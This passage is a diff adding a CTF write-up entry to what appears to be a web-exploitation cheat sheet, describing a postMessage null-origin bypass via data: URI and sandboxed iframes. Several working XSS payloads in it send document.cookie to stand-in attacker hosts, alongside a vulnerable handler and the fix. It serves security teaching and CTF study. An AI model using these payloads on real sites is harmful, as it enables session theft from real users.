@@ -19,6 +19,7 @@ Unicode bypass, CSS-only exfiltration, behavioral JS frameworks, timing oracles,
 - [XSS via Referer Header Injection (Tokyo Westerns 2017)](#xss-via-referer-header-injection-tokyo-westerns-2017)
 - [Java hashCode() Collision for Auth Bypass (CSAW 2017)](#java-hashcode-collision-for-auth-bypass-csaw-2017)
 - [CSS @font-face unicode-range Data Exfiltration (Harekaze CTF 2018)](#css-font-face-unicode-range-data-exfiltration-harekaze-ctf-2018)
+- [postMessage Null Origin Bypass via data URI Iframe (BackdoorCTF 2018)](#postmessage-null-origin-bypass-via-data-uri-iframe-backdoorctf-2018)
 
 ---
 
@@ -584,3 +585,69 @@ app.run(host='0.0.0.0', port=80)
 ```
 
 **Key insight:** CSS `@font-face` with `unicode-range` triggers font fetches only for characters actually present in the target element. Works under strict CSP that blocks scripts but allows `style-src`. Cross-origin CSS must include `Content-Type: text/css`. Leaks character set (not order), so combine with positional CSS tricks if ordering matters. See also the [CSS Font Glyph Width + Container Query Exfiltration](#css-font-glyph-width--container-query-exfiltration-unbreakable-2026) technique for a more precise CSS-only oracle.
+
+---
+
+### postMessage Null Origin Bypass via data URI Iframe (BackdoorCTF 2018)
+
+**Pattern:** When a web application validates `postMessage` origins, a `data:` URI iframe has a `null` origin that bypasses same-origin checks. Many postMessage handlers check `event.origin !== expected` but don't account for `null` origins, allowing injection from a sandboxed context.
+
+**Vulnerable handler pattern:**
+```javascript
+// Target application's message handler:
+window.addEventListener('message', function(event) {
+    // Weak origin check — doesn't handle null origin
+    if (event.origin === 'http://trusted.com' || !event.origin) {
+        // Process message — renders user-controlled HTML/JS
+        document.getElementById('content').innerHTML = event.data.details.sender_username;
+    }
+});
+```
+
+**Exploit via data: URI iframe:**
+```html
+<iframe src="data:text/html,<script>
+var w = window.open('http://target/page');
+setTimeout(function(){
+    w.postMessage({type:'audio', details:{
+        sender_username:'<img src=x onerror=fetch(`http://attacker/`+document.cookie)>'}
+    }, '*');
+}, 1000);
+</script>"></iframe>
+```
+
+**Alternative: sandboxed iframe approach:**
+```html
+<!-- sandbox attribute without allow-same-origin also produces null origin -->
+<iframe sandbox="allow-scripts" srcdoc="
+<script>
+    parent.postMessage({type:'audio', details:{
+        sender_username:'<img src=x onerror=fetch(`http://attacker/`+document.cookie)>'}
+    }, '*');
+</script>
+"></iframe>
+```
+
+```python
+# Host the exploit page on attacker server
+exploit_html = '''
+<html><body>
+<iframe src="data:text/html,
+<script>
+var w = window.open('http://target/messages');
+setTimeout(function(){
+    w.postMessage({
+        type: 'audio',
+        details: {
+            sender_username: '<img src=x onerror=fetch(`http://attacker.com/steal?c=`+document.cookie)>'
+        }
+    }, '*');
+}, 1500);
+</script>
+"></iframe>
+</body></html>
+'''
+# Serve this page, then send the URL to the admin bot
+```
+
+**Key insight:** `data:` URI iframes have a `null` origin. Many postMessage handlers check `event.origin !== expected` but don't account for null origins, allowing injection from a sandboxed context. The `sandbox` attribute without `allow-same-origin` also produces a `null` origin. Always test postMessage handlers with `null` origin by using `data:` URIs or sandboxed iframes. The fix is to explicitly reject `null` and empty origins: `if (!event.origin || event.origin === 'null') return;`.
